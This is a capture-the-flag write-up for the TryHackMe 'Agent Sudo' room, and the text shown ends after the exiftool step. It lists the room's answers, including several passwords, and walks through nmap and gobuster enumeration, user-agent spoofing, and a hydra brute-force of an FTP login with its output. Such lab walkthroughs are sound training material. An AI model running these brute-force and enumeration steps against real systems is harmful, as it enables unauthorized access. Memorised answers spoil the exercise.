---
layout: post
title: Agent Sudo
categories: [CyberSecurity, CTF]
tags: [thm, easy, nmap, gobuster, hydra, exiftool, xxd, binwalk, zip2john, JohnTheRipper, 7z, Cyberchef, steghide]
---
## Task 1: Author Note
Welcome to another THM exclusive CTF room. Your task is simple, capture the flags just like the other CTF room. Have Fun!

If you are stuck inside the black hole, post on the forum or ask in the TryHackMe discord.

## Task 2: Enumerate
Enumerate the machine and get all the important information

### Questions

Q1 How many opens Ports?
```
3
```
Q2 How you redirect yourself to a secret page?
```
user-agent
```
Q3 What is the agent name?
```
chris
```
### MyWalk

Beginning with an **nmap** scan, and save the results on nmap/initial for future reference:

```bash
nmap -T4 -sC -sV -Pn -oN nmap/initial 10.10.188.70
```

Now I try to get the Q2 answer, using **gobuster**:


```bash
gobuster dir --url http://10.10.26.150 -w //usr/share/wordlists/dirb/common.txt | tee gobuster.txt
```

No secret page revealed...  
Hint: Answer format: xxxx-xxxxx  
visiting the page we got:

```
Dear agents,
Use your own codename as user-agent to access the site.

From,
Agent R

```
it seems Q2 is "user-agent"

The hint for Q3:  
"You might face problem on using Firefox. Try 'user agent switcher' plugin with  user agent: C"  
So, let's install user agent switcher plugin, and set the user agent as "C".  After reloading the page I got:
```
Attention chris,

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!


From,

Agent R
```
Now we know the Q3

## Task 3: Hash cracking and brute-force

Done enumerate the machine? Time to brute your way out.

### Questions
Q1. Hint: "Hail hydra!"  
Q1. FTP password

```
crystal
```

Q2. Zip file password

```
alien
```

Q3. steg password

```
Area51
```

Q4 Who is the other agent (in full name)?

```
james
```

Q5 SSH password

```
hackerrules!
```

### MyWalk

For Q3 lets try **hydra** as sugested by the hint:

```bash
hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.10.149.150 -t 4
...
[21][ftp] host: 10.10.149.150 login: chris password: crystal
1 of 1 target successfully completed, 1 valid password found
```
Q1 done

Now lets connect to the ftp server with chris:crystal

```bash
└─$ ftp chris@10.10.149.150
Connected to 10.10.149.150.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||36713|)
150 Here comes the directory listing.
-rw-r--r-- 1 0 0 217 Oct 29 2019 To_agentJ.txt
-rw-r--r-- 1 0 0 33143 Oct 29 2019 cute-alien.jpg
-rw-r--r-- 1 0 0 34842 Oct 29 2019 cutie.png
226 Directory send OK.
ftp>
```

We can´t see any zip file refered in Q2
After dowloading the 3 files and opened the To_agentJ.txt we got...

```
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,

Agent C
```

So we need to use **exiftool** to extract login password.

[https://exiftool.org/examples.html](https://exiftool.org/examples.html)  


```bash
└─$ exiftool cute-alien.jpg
ExifTool Version Number : 12.67
File Name : cute-alien.jpg
Directory : .
File Size : 33 kB
File Modification Date/Time : 2019:10:29 08:22:37-04:00
File Access Date/Time : 2024:01:10 11:49:00-05:00
File Inode Change Date/Time : 2024:01:10 11:49:00-05:00
File Permissions : -rw-r--r--
File Type : JPEG
File Type Extension : jpg
MIME Type : image/jpeg
JFIF Version : 1.01
Resolution Unit : inches
X Resolution : 96
Y Resolution : 96
Image Width : 440
Image Height : 501
Encoding Process : Baseline DCT, Huffman coding
Bits Per Sample : 8
Color Components : 3
Y Cb Cr Sub Sampling : YCbCr4:2:0 (2 2)
Image Size : 440x501
Megapixels : 0.220
```

```bash
└─$ exiftool cutie.png
ExifTool Version Number : 12.67
File Name : cutie.png
Directory : .
File Size : 35 kB
File Modification Date/Time : 2019:10:29 08:33:51-04:00
File Access Date/Time : 2024:01:10 11:49:17-05:00
File Inode Change Date/Time : 2024:01:10 11:49:17-05:00
File Permissions : -rw-r--r--
File Type : PNG
File Type Extension : png
MIME Type : image/png
Image Width : 528
Image Height : 528
Bit Depth : 8
Color Type : Palette
Compression : Deflate/Inflate
Filter : Adaptive
Interlace : Noninterlaced
Palette : (Binary data 762 bytes, use -b option to extract)
Transparency : (Binary data 42 bytes, use -b option to extract)
Warning : [minor] Trailer data after PNG IEND chunk
Image Size : 528x528
Megapixels : 0.279
```